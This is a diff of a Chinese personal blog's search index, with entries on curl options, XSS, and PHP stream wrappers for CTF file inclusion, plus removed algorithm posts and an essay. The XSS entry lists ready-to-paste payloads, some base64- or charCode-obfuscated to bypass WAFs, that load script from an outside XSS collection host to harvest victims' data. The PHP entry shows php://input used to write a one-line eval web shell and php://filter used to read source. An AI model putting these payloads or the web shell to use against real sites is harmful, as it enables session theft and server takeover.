+curl -A &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36&#39; https://google.com
+上面命令将User-Agent改成 Chrome 浏览器。
+
+curl -A &#39;&#39; https://google.com
+上面命令会移除User-Agent标头。
+
+3.也可以通过-H参数直接指定标头，更改User-Agent。
+curl -H &#39;User-Agent: php/1.0&#39; https://google.com
+
+4.-b
+-b参数用来向服务器发送 Cookie。
+curl -b &#39;foo=bar&#39; https://google.com
+上面命令会生成一个标头Cookie: foo=bar，向服务器发送一个名为foo、值为bar的 Cookie。
+
+curl -b &#39;foo1=bar;foo2=bar2&#39; https://google.com
+上面命令发送两个 Cookie。
+
+curl -b cookies.txt https://www.google.com
+上面命令读取本地文件cookies.txt，里面是服务器设置的 Cookie（参见-c参数），将其发送到服务器。
+
+5.-c
+-c参数将服务器设置的 Cookie 写入一个文件。
+
+curl -c cookies.txt https://www.google.com
+上面命令将服务器的 HTTP 回应所设置 Cookie 写入文本文件cookies.txt。
+
+6.-d
+-d参数用于发送 POST 请求的数据体。
+
+curl -d&#39;login=emma＆password=123&#39;-X POST https://google.com/login
+# 或者
+curl -d &#39;login=emma&#39; -d &#39;password=123&#39; -X POST  https://google.com/login
+使用-d参数以后，HTTP 请求会自动加上标头Content-Type : application/x-www-form-urlencoded。并且会自动将请求转为 POST 方法，因此可以省略-X POST。
+
+-d参数可以读取本地文本文件的数据，向服务器发送。
+
+curl -d &#39;@data.txt&#39; https://google.com/login
+上面命令读取data.txt文件的内容，作为数据体向服务器发送。
+
+7.--data-urlencode
+--data-urlencode参数等同于-d，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。
+
+curl --data-urlencode &#39;comment=hello world&#39; https://google.com/login
+上面代码中，发送的数据hello world之间有一个空格，需要进行 URL 编码。
+
+9.-e
+-e参数用来设置 HTTP 的标头Referer，表示请求的来源。
+
+curl -e &#39;https://google.com?q=example&#39; https://www.example.com
+上面命令将Referer标头设为https://google.com?q=example。
+
+10.-H参数可以通过直接添加标头Referer，达到同样效果。
+
+curl -H &#39;Referer: https://google.com?q=example&#39; https://www.example.com
+
+11.-F
+-F参数用来向服务器上传二进制文件。
+
+curl -F &#39;file=@photo.png&#39; https://google.com/profile
+上面命令会给 HTTP 请求加上标头Content-Type: multipart/form-data，然后将文件photo.png作为file字段上传。
+
+-F参数可以指定 MIME 类型。
+
+curl -F &#39;file=@photo.png;type=image/png&#39; https://google.com/profile
+上面命令指定 MIME 类型为image/png，否则 curl 会把 MIME 类型设为application/octet-stream。
+
+-F参数也可以指定文件名。
+
+curl -F &#39;file=@photo.png;filename=me.png&#39; https://google.com/profile
+上面命令中，原始文件名为photo.png，但是服务器接收到的文件名为me.png。
+
+12.-G
+-G参数用来构造 URL 的查询字符串。
+
+curl -G -d &#39;q=kitties&#39; -d &#39;count=20&#39; https://google.com/search
+上面命令会发出一个 GET 请求，实际请求的 URL 为https://google.com/search?q=kitties&amp;count=20。如果省略--G，会发出一个 POST 请求。
+
+如果数据需要 URL 编码，可以结合--data--urlencode参数。
+
+curl -G --data-urlencode &#39;comment=hello world&#39; https://www.example.com
+
+13.-H
+-H参数添加 HTTP 请求的标头。
+
+curl -H &#39;Accept-Language: en-US&#39; https://google.com
+上面命令添加 HTTP 标头Accept-Language: en-US。
+
+curl -H &#39;Accept-Language: en-US&#39; -H &#39;Secret-Message: xyzzy&#39; https://google.com
+上面命令添加两个 HTTP 标头。
+
+
+14.-d
+
+curl -d &#39;&#123;&quot;login&quot;: &quot;emma&quot;, &quot;pass&quot;: &quot;123&quot;&#125;&#39; -H &#39;Content-Type: application/json&#39; https://google.com/login
+上面命令添加 HTTP 请求的标头是Content-Type: application/json，然后用-d参数发送 JSON 数据。
+
+15.-i
+-i参数打印出服务器回应的 HTTP 标头。
+
+curl -i https://www.example.com
+上面命令收到服务器回应后，先输出服务器回应的标头，然后空一行，再输出网页的源码。
+
+16.-I
+-I参数向服务器发出 HEAD 请求，然会将服务器返回的 HTTP 标头打印出来。
+
+
+curl -I https://www.example.com
+上面命令输出服务器对 HEAD 请求的回应。
+
+--head参数等同于-I。
+
+curl --head https://www.example.com
+
+17.-k
+-k参数指定跳过 SSL 检测。
+
+curl -k https://www.example.com
+上面命令不会检查服务器的 SSL 证书是否正确。
+
+18.-L
+-L参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。
+
+curl -L -d &#39;tweet=hi&#39; https://api.twitter.com/tweet
+--limit-rate
+--limit-rate用来限制 HTTP 请求和回应的带宽，模拟慢网速的环境。
+
+19.curl --limit-rate 200k https://google.com
+上面命令将带宽限制在每秒 200K 字节。
+
+20.-o
+-o参数将服务器的回应保存成文件，等同于wget命令。
+
+curl -o example.html https://www.example.com
+上面命令将www.example.com保存成example.html。
+
+21.-O
+-O参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。
+
+curl -O https://www.example.com/foo/bar.html
+上面命令将服务器回应保存成文件，文件名为bar.html。
+
+22.-s
+-s参数将不输出错误和进度信息。
+
+curl -s https://www.example.com
+上面命令一旦发生错误，不会显示错误信息。不发生错误的话，会正常显示运行结果。
+
+如果想让 curl 不产生任何输出，可以使用下面的命令。
+
+curl -s -o /dev/null https://google.com
+
+23.-S
+-S参数指定只输出错误信息，通常与-s一起使用。
+
+curl -s -o /dev/null https://google.com
+上面命令没有任何输出，除非发生错误。
+
+24-u
+-u参数用来设置服务器认证的用户名和密码。
+
+curl -u &#39;bob:12345&#39; https://google.com/login
+上面命令设置用户名为bob，密码为12345，然后将其转为 HTTP 标头Authorization: Basic Ym9iOjEyMzQ1。
+
+curl 能够识别 URL 里面的用户名和密码。
+
+curl https://bob:12345@google.com/login
+上面命令能够识别 URL 里面的用户名和密码，将其转为上个例子里面的 HTTP 标头。
+
+curl -u &#39;bob&#39; https://google.com/login
+上面命令只设置了用户名，执行后，curl 会提示用户输入密码。
+
+25.-v
+-v参数输出通信的整个过程，用于调试。
+
+curl -v https://www.example.com
+--trace参数也可以用于调试，还会输出原始的二进制数据。
+
+curl --trace - https://www.example.com
+
+26.-x
+-x参数指定 HTTP 请求的代理。
+
+curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com
+上面命令指定 HTTP 请求通过myproxy.com:8080的 socks5 代理发出。
+
+如果没有指定代理协议，默认为 HTTP。
+
+curl -x james:cats@myproxy.com:8080 https://www.example.com
+上面命令中，请求的代理使用 HTTP 协议。
+
+27.-X
+-X参数指定 HTTP 请求的方法。
+
+curl -X POST https://www.example.com
+上面命令对https://www.example.com发出 POST 请求。
+</code></pre>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>curl</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTML</title>
+    <url>/2023/04/12/htmllearing/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>前端</category>
+      </categories>
+      <tags>
+        <tag>html</tag>
+        <tag>学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XSS</title>
+    <url>/2023/04/16/XSS/</url>
+    <content><![CDATA[<p><a href="https://xss.yt/index/user.html">XSS平台</a></p>
+<pre><code class="bash">将如下代码植入怀疑出现xss的地方（注意&#39;的转义），即可在 项目内容 观看XSS效果。
+
+当前项目URL地址为：https://xss.yt/YLgl        【注意新增https，插入对方网站代码前缀http或者https都可】
+
+&lt;/tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC=//xss.yt/YLgl&gt;&lt;/sCrIpT&gt;
+或者
+
+&#39;&quot;&gt;&lt;input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus&gt;
+&#39;&quot;&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))&gt;
+&#39;&quot;&gt;&lt;video&gt;&lt;source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7&gt;
+&#39;&quot;&gt;&lt;script&gt;function b()&#123;eval(this.responseText)&#125;;a=new XMLHttpRequest();a.addEventListener(&quot;load&quot;, b);a.open(&quot;GET&quot;, &quot;https://xss.yt/YLgl&quot;);a.send();&lt;/script&gt;
+&lt;img src=x onerror=s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;//xss.yt/YLgl&#39;;&gt;
+下方XSS代码过一般WAF [注意如果直接把代码放入Burp，111则需要把下方代码进行URL编码]
+
+&lt;embed src=https://xss.yt/liuyan/xs.swf?a=e&amp;c=docu0075ment.write(Stu0072ing.fromu0043harCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,115,46,121,116,47,89,76,103,108,62,60,47,115,67,114,73,112,84,62)) allowscriptaccess=always type=application/x-shockwave-flash&gt;&lt;/embed&gt;
+若使用下方XSS代码请注意(下面代码会引起网页空白不得已慎用，注意如果使用下面的代码，一定要勾选&quot;基础默认XSS&quot;模块)
+
+&lt;img src=&quot;&quot; onerror=&quot;document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,115,46,121,116,47,89,76,103,108,62,60,47,115,67,114,73,112,84,62))&quot;&gt;
+↓↓↓！~极限代码~！(可以不加最后的&gt;回收符号，下面代码已测试成功)↓↓↓
+
+&lt;sCRiPt/SrC=//xss.yt/YLgl&gt;
+</code></pre>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>xss</tag>
       </tags>
   </entry>
   <entry>
@@ -1041,114 +977,6 @@ re.findall(&quot;style/\w&#123;60&#125;.jpg&quot;,&quot;&quot;)
       </tags>
   </entry>
   <entry>
-    <title>动态规划(一)</title>
-    <url>/2023/04/19/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E4%B8%80/</url>
-    <content><![CDATA[<blockquote>
-<p>注：本文思路来源于左程云老师</p>
-</blockquote>
-<h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2>]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
-        <tag>动态规划</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>应是天仙狂醉，乱把白云揉碎</title>
-    <url>/2023/04/18/%E5%BA%94%E6%98%AF%E5%A4%A9%E4%BB%99%E7%8B%82%E9%86%89%EF%BC%8C%E4%B9%B1%E6%8A%8A%E7%99%BD%E4%BA%91%E6%8F%89%E7%A2%8E/</url>
-    <content><![CDATA[<blockquote>
-<p>人是一根会思想的苇草</p>
-</blockquote>
-<p>这是一场非正式会谈，我与我的。</p>
-<p>我这一生最讨厌三种人，欺骗、不守约定、孰若无睹，事实上，无比憎恨。</p>
-<p>想必这和我的经历有关，但我也不愿提及，就此散去吧。</p>
-<p>忽然想来，18年来，没有一日不彷徨无知，我还未曾真正瞧过自己一眼，或许瞧过，未曾入眼。</p>
-<p>讨厌的事情总是莫名其妙，就好像我不喜欢下雨，却又喜欢淋雨，或许这就是我的归宿，我也无力改变，但是我又的的确确要做些什么。倘若什么都不做，任由雨打满身，那也有点可悲，我不惧雨淋，不惧湿身，但也要在淋雨时迎风跑起，让那雨更猛烈的捶打着我，下次再遇见这雨，可就亲切又自然了。</p>
-<p>雨淋多了，总是会生病的。可能我也病了，我也不例外，这世界上病的人当然很多，病的千奇百怪，却没有人与我相似。在迷茫中寻求希望，未免是有点天真无知的。我不妄想希望的存在，我想成为自己的希望，千真万确。虽然听起来，更像是妄想。</p>
-<p>我又何尝不知我是在画地为牢，那又如何，属于我的一隅之地，也容许我孤芳自赏，这里不因是我的囚笼，这是我的天堂，我孤身起舞，不辜负我孤傲的人生。</p>
-<blockquote>
-<p>2023 4 18 萃文楼<br> 无法顶格空格的事，姑且下次再谈吧</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>日常</category>
-      </categories>
-      <tags>
-        <tag>不是好事</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XSS</title>
-    <url>/2023/04/16/XSS/</url>
-    <content><![CDATA[<p><a href="https://xss.yt/index/user.html">XSS平台</a></p>
-<pre><code class="bash">将如下代码植入怀疑出现xss的地方（注意&#39;的转义），即可在 项目内容 观看XSS效果。
-
-当前项目URL地址为：https://xss.yt/YLgl        【注意新增https，插入对方网站代码前缀http或者https都可】
-
-&lt;/tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC=//xss.yt/YLgl&gt;&lt;/sCrIpT&gt;
-或者
-
-&#39;&quot;&gt;&lt;input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus&gt;
-&#39;&quot;&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))&gt;
-&#39;&quot;&gt;&lt;video&gt;&lt;source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7&gt;
-&#39;&quot;&gt;&lt;script&gt;function b()&#123;eval(this.responseText)&#125;;a=new XMLHttpRequest();a.addEventListener(&quot;load&quot;, b);a.open(&quot;GET&quot;, &quot;https://xss.yt/YLgl&quot;);a.send();&lt;/script&gt;
-&lt;img src=x onerror=s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;//xss.yt/YLgl&#39;;&gt;
-下方XSS代码过一般WAF [注意如果直接把代码放入Burp，111则需要把下方代码进行URL编码]
-
-&lt;embed src=https://xss.yt/liuyan/xs.swf?a=e&amp;c=docu0075ment.write(Stu0072ing.fromu0043harCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,115,46,121,116,47,89,76,103,108,62,60,47,115,67,114,73,112,84,62)) allowscriptaccess=always type=application/x-shockwave-flash&gt;&lt;/embed&gt;
-若使用下方XSS代码请注意(下面代码会引起网页空白不得已慎用，注意如果使用下面的代码，一定要勾选&quot;基础默认XSS&quot;模块)
-
-&lt;img src=&quot;&quot; onerror=&quot;document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,115,46,121,116,47,89,76,103,108,62,60,47,115,67,114,73,112,84,62))&quot;&gt;
-↓↓↓！~极限代码~！(可以不加最后的&gt;回收符号，下面代码已测试成功)↓↓↓
-
-&lt;sCRiPt/SrC=//xss.yt/YLgl&gt;
-</code></pre>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>xss</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>洛谷p1616</title>
-    <url>/2023/04/19/%E6%B4%9B%E8%B0%B7p1616/</url>
-    <content><![CDATA[<h1 id="疯狂的采药"><a href="#疯狂的采药" class="headerlink" title="疯狂的采药"></a>疯狂的采药</h1><h2 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h2><p>此题为纪念 LiYuxiang 而生。</p>
-<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>LiYuxiang 是个天资聪颖的孩子，他的梦想是成为世界上最伟大的医师。为此，他想拜附近最有威望的医师为师。医师为了判断他的资质，给他出了一个难题。医师把他带到一个到处都是草药的山洞里对他说：“孩子，这个山洞里有一些不同种类的草药，采每一种都需要一些时间，每一种也有它自身的价值。我会给你一段时间，在这段时间里，你可以采到一些草药。如果你是一个聪明的孩子，你应该可以让采到的草药的总价值最大。”</p>
-<p>如果你是 LiYuxiang，你能完成这个任务吗？</p>
-<p>此题和原题的不同点：</p>
-<p>$1$. 每种草药可以无限制地疯狂采摘。</p>
-<p>$2$. 药的种类眼花缭乱，采药时间好长好长啊！师傅等得菊花都谢了！</p>
-<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入第一行有两个整数，分别代表总共能够用来采药的时间 $t$ 和代表山洞里的草药的数目 $m$。</p>
-<p>第 $2$ 到第 $(m + 1)$ 行，每行两个整数，第 $(i + 1)$ 行的整数 $a_i, b_i$ 分别表示采摘第 $i$ 种草药的时间和该草药的价值。</p>
-<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>输出一行，这一行只包含一个整数，表示在规定的时间内，可以采到的草药的最大总价值。</p>
-<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><pre><code>70 3
-71 100
-69 1
-1 2
-</code></pre>
-<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><pre><code>140
-</code></pre>
-<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><h4 id="数据规模与约定"><a href="#数据规模与约定" class="headerlink" title="数据规模与约定"></a>数据规模与约定</h4><ul>
-<li>对于 $30%$ 的数据，保证 $m \le 10^3$ 。</li>
-<li>对于 $100%$ 的数据，保证 $1 \leq m \le 10^4$，$1 \leq t \leq 10^7$，且 $1 \leq m \times t \leq 10^7$，$1 \leq a_i, b_i \leq 10^4$。</li>
-</ul>
-<blockquote>
-<p>显然这个一个完全背包问题，对于完全背包问题的求解</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
-        <tag>动态规划</tag>
-        <tag>背包问题</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>pythonlist</title>
     <url>/2023/04/21/pythonlist/</url>
     <content><![CDATA[<h4 id="str"><a href="#str" class="headerlink" title="str"></a>str</h4><ul>
@@ -1236,54 +1064,176 @@ re.findall(&quot;style/\w&#123;60&#125;.jpg&quot;,&quot;&quot;)
       </tags>
   </entry>
   <entry>
-    <title>过河卒</title>
-    <url>/2023/04/26/%E8%BF%87%E6%B2%B3%E5%8D%92/</url>
-    <content><![CDATA[<pre><code class="cpp">#include&lt;iostream&gt;
-#include&lt;vector&gt;
-
-using namespace std;
-
-long long int isvalid(int x, int y, vector&lt;vector&lt;long long int&gt;&gt; map) &#123;
-    if (map[x][y] == -1) return 0;
-    else return map[x][y];
-&#125;
-int main() &#123;
-    int x1, y1, x2, y2;
-    cin &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; y2;
-    vector&lt;vector&lt;long long int&gt;&gt; map(x1 + 1, vector&lt;long long int&gt;(y1 + 1,0));
-
-    map[x2][y2] = -1;
-    int dx[] = &#123;1, 2, 2, 1, -1, -2, -2, -1&#125;;
-    int dy[] = &#123;-2, -1, 1, 2, 2, 1, -1, -2&#125;;
-    for (int i = 0; i &lt; 8; ++i) &#123;
-        int nx = x2 + dx[i];
-        int ny = y2 + dy[i];
-        if (nx &gt;= 0 &amp;&amp; nx &lt;= x1 &amp;&amp; ny &gt;= 0 &amp;&amp; ny &lt;= y1) &#123;
-            map[nx][ny] = -1;
-        &#125;
-    &#125;
-
-    for (int i = 1; i &lt;= x1; ++i) &#123;
-        if(map[i][0]!=-1)map[i][0] = 1;
-        else break;
-    &#125;
-    for (int i = 1; i &lt;= y1; ++i) &#123;
-        if(map[0][i]!=-1)map[0][i] = 1;
-        else break;
-    &#125;
-
-    for (int i = 1; i &lt;= x1; ++i) &#123;
-        for (int j = 1; j &lt;= y1; ++j) &#123;
-            if (map[i][j] != -1) &#123;
-                map[i][j] = isvalid(i - 1, j, map) + isvalid(i, j - 1, map);
-            &#125;
-        &#125;
-    &#125;
-    
-    cout&lt;&lt;map[x1][y1];
-    
-&#125;
+    <title>伪协议</title>
+    <url>/2023/05/12/%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<h3 id="file-x2F-x2F-协议"><a href="#file-x2F-x2F-协议" class="headerlink" title="file:&#x2F;&#x2F; 协议"></a>file:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:off/on</code><br><code>allow_url_include :off/on</code><br>作用：<br>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受<code>allow_url_fopen与allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。<br>说明：<br>file:&#x2F;&#x2F; 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以&#x2F;、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()，include_path</code> 会可选地搜索，也作为相对的路径。<br>用法：</p>
+<pre><code class="bash">/path/to/file.ext
+relative/path/to/file.ext
+fileInCwd.ext
+C:/path/to/winfile.ext
+C:\path\to\winfile.ext
+\\smbserver\share\path\to\winfile.ext
+file:///path/to/file.ext
 </code></pre>
+<p>示例：</p>
+<ul>
+<li>file:&#x2F;&#x2F;[文件的绝对路径和文件名]</li>
+</ul>
+<p><code>http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</code></p>
+<ul>
+<li>[文件的相对路径和文件名]</li>
+</ul>
+<p><code>http://127.0.0.1/include.php?file=./phpinfo.txt</code></p>
+<ul>
+<li>[http：&#x2F;&#x2F;网络路径和文件名]<br><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></li>
+</ul>
+<h3 id="php-x2F-x2F-协议"><a href="#php-x2F-x2F-协议" class="headerlink" title="php:&#x2F;&#x2F; 协议"></a>php:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:off/on</code><br><code>allow_url_include :仅php://input php://stdin php://memory</code><br><code>php://temp 需要on</code><br>作用：<br>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行php代码。<br>说明：<br>PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
+<p>作用</p>
+<pre><code class="bash">php://input:可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=&quot;multipart/form-data&quot; 的时候php://input 是无效的。
+php://output:只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。
+php://fd:(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。
+php://memory php://temp(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。
+php://filter:(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。
+</code></pre>
+<h4 id="php-x2F-x2F-filter参数详解"><a href="#php-x2F-x2F-filter参数详解" class="headerlink" title="php:&#x2F;&#x2F;filter参数详解"></a>php:&#x2F;&#x2F;filter参数详解</h4><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：<br>php:&#x2F;&#x2F;filter 参数描述</p>
+<ul>
+<li>resource&#x3D;&lt;要过滤的数据流&gt;必须项。它指定了你要筛选过滤的数据流。</li>
+<li>read&#x3D;&lt;读链的过滤器&gt;可选项。可以设定一个或多个过滤器名称，以管道符（<em>\ </em>）分隔。</li>
+<li>write&#x3D;&lt;写链的过滤器&gt;可选项。可以设定一个或多个过滤器名称，以管道符（\）分隔。</li>
+<li>&lt;; 两个链的过滤器&gt;任何没有以 read&#x3D; 或 write&#x3D; 作前缀的筛选器列表会视情况应用于读或写链。</li>
+</ul>
+<p>可用的过滤器列表（4类）</p>
+<ul>
+<li>字符串过滤器<br>string.rot13 等同于str_rot13()，rot13变换<br>string.toupper 等同于strtoupper()，转大写字母<br>string.tolower 等同于strtolower()，转小写字母<br>string.strip_tags 等同于strip_tags()，去除html、PHP语言标签</li>
+<li>转换过滤器<br>convert.base64-encode &amp; convert.base64-decode 等同于base64_encode()和base64_decode()，base64编码解码<br>convert.quoted-printable-encode &amp; convert.quoted-printable-decode quoted-printable 字符串与 8-bit 字符串编码解码</li>
+<li>压缩过滤器<br>zlib.deflate &amp; zlib.inflate 在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。<br>bzip2.compress &amp; bzip2.decompress 同上，在本地文件系统中创建 bz2 兼容文件的方法。</li>
+<li>加密过滤器<br>mcrypt.<em>libmcrypt 对称加密算法<br>mdecrypt.</em> libmcrypt 对称解密算法<br>示例：</li>
+</ul>
+<p><code>php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）</code></p>
+<p><code>http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</code></p>
+<p><code>php://input + [POST DATA]执行php代码</code></p>
+<pre><code class="bash">http://127.0.0.1/include.php?file=php://input
+[POST DATA部分]
+&lt;?php phpinfo(); ?&gt;
+图片描述
+</code></pre>
+<p>若有写入权限，写入一句话木马</p>
+<pre><code class="bash">http://127.0.0.1/include.php?file=php://input
+[POST DATA部分]
+&lt;?php fputs(fopen(&#39;1juhua.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;
+</code></pre>
+<h3 id="zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议"><a href="#zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议" class="headerlink" title="zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 协议"></a>zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:off/on</code><br><code>allow_url_include :off/on</code><br>作用：zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。<br>示例：</p>
+<p>zip:&#x2F;&#x2F;[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</p>
+<p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>
+<p><code>http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</code></p>
+<p><code>compress.bzip2://file.bz2</code></p>
+<p>压缩 <code>phpinfo.txt</code> 为<code>phpinfo.bz2</code>并上传（同样支持任意后缀名）</p>
+<p><code>http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</code></p>
+<p><code>compress.zlib://file.gz</code></p>
+<p>压缩<code>phpinfo.txt</code>为<code> phpinfo.gz</code> 并上传（同样支持任意后缀名）</p>
+<p><code>http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</code></p>
+<h3 id="data-x2F-x2F-协议"><a href="#data-x2F-x2F-协议" class="headerlink" title="data:&#x2F;&#x2F; 协议"></a>data:&#x2F;&#x2F; 协议</h3><p>条件：<br><code>allow_url_fopen:on</code><br><code>allow_url_include :on</code><br>作用：自PHP&gt;&#x3D;5.2.0起，可以使用data:&#x2F;&#x2F;数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。<br>用法：</p>
+<p><code>data://text/plain,</code><br><code>data://text/plain;base64,</code><br>示例：</p>
+<pre><code class="bash">data://text/plain,
+
+http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;
+
+or
+
+data://text/plain;base64,
+
+http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+</code></pre>
+<h3 id="http-和https-协议"><a href="#http-和https-协议" class="headerlink" title="http://和https://协议"></a><code>http://</code>和<code>https://</code>协议</h3><p>条件：<br><code>allow_url_fopen:on</code><br><code>allow_url_include :on</code><br>作用：常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。<br>用法：</p>
+<pre><code class="bash">http://example.com
+http://example.com/file.php?var1=val1&amp;var2=val2
